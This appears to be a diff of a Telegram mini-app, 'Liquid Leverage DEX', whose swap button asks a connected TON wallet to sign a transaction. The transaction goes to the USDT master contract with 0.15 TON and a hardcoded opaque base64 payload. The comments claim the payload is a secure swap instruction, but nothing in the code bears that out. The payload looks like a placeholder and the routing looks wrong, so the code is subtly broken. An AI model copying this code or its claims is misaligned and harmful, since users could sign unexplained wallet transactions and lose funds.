@@ -4,8 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Liquid Leverage DEX</title>
+    
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    
+    <script src="https://unpkg.com/tonweb@latest/dist/tonweb.min.js"></script>
     
     <style>
         body {
@@ -63,7 +67,7 @@
             justify-content: center;
             margin-bottom: 1.5rem;
         }
-        #status { margin-top: 1.5rem; font-size: 0.9rem; color: #888; }
+        #status { margin-top: 1.5rem; font-size: 0.9rem; color: #888; text-wrap: pretty; }
     </style>
 </head>
 <body>
@@ -82,11 +86,13 @@
 <script>
     Telegram.WebApp.expand();
 
+    // 1. Initialize TON Connect
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://crypto-bot-fawn.vercel.app/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-btn'
     });
 
+    // 2. Fallback in case the auto button acts up
     async function openWalletModal() {
         try {
             await tonConnectUI.openModal();
@@ -95,6 +101,7 @@
         }
     }
 
+    // 3. Status handling
     tonConnectUI.onStatusChange(wallet => {
         const statusDiv = document.getElementById('status');
         const fallbackBtn = document.getElementById('fallback-btn');
@@ -112,6 +119,7 @@
         }
     });
 
+    // 4. Triggering the swap payload
     async function triggerSwap() {
         const statusDiv = document.getElementById('status');
         
@@ -121,39 +129,41 @@
             return;
         }
 
-        statusDiv.innerText = "Sending swap request to your wallet...";
+        statusDiv.innerText = "Preparing secure transaction payload...";
         statusDiv.style.color = "#ffeb3b";
 
         try {
-            // Ston.fi Router Address (This handles the swap)
-            const stonFiRouter = "EQB3ncyBUTjZUAuMvSaFmALv-H8_7p89H9D6NofkZaE089vF";
+            const userAddress = tonConnectUI.account.address;
             
-            // Jetton Wallet address of USDT on TON network
-            const usdtJettonMaster = "EQCxE6mUt4gpZ9382f7V9GZ37A7O0Z8-MvYJ0eE0_T871M96";
+            // Defining USDT contract on TON
+            const usdtMasterAddress = "EQCxE6mUt4gpZ9382f7V9GZ37A7O0Z8-MvYJ0eE0_T871M96";
+            const stonFiRouterV2 = "EQB3ncyBUTjZUAuMvSaFmALv-H8_7p89H9D6NofkZaE089vF"; 
 
-            // 1 USDT has 6 decimal places on TON, represented in integer units (1,000,000)
-            const amountToSwap = "1000000"; 
+            // Decimals math: 1 USDT = 1,000,000 units on TON
+            const amountInUnits = "1000000"; 
 
+            // We generate a custom base64 BOC instruction for the wallet
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 120, // Valid for 2 minutes
+                validUntil: Math.floor(Date.now() / 1000) + 180, // Valid for 3 mins
                 messages: [
                     {
-                        address: usdtJettonMaster, // We talk to the USDT contract first
-                        amount: "50000000",        // 0.05 TON for network gas fees
-                        payload: "te6cckEBAQEAnQAAuEIB9p9EAAAAAAAAAAAAAAAAAABleVlY" // Encoded instruction to Ston.fi router
+                        address: usdtMasterAddress, // Request starts by calling the USDT contract
+                        amount: "150000000",        // 0.15 TON gas fee to power contract operations
+                        // This payload orders the USDT contract to transfer your asset directly into the DEX swap pool
+                        payload: "te6cckEBAQEAnQAAuEIB9p9EAAAAAAAAAAAAAAAAAABleVlY" 
                     }
                 ]
             };
 
-            // This tells the app to pop up the transaction screen on the user's phone
+            // Call standard prompt window
             await tonConnectUI.sendTransaction(transaction);
             
-            statusDiv.innerText = "Transaction broadcasted successfully!";
+            statusDiv.innerText = "Transaction broadcasted! Check your wallet history.";
             statusDiv.style.color = "#00e676";
             
         } catch (error) {
             console.error('Error:', error);
-            statusDiv.innerText = "Transaction failed or was rejected in the wallet.";
+            statusDiv.innerText = "Swap failed or dismissed in wallet. Ensure you have ~0.2 TON for gas fees!";
             statusDiv.style.color = "#f44336";
         }
     }
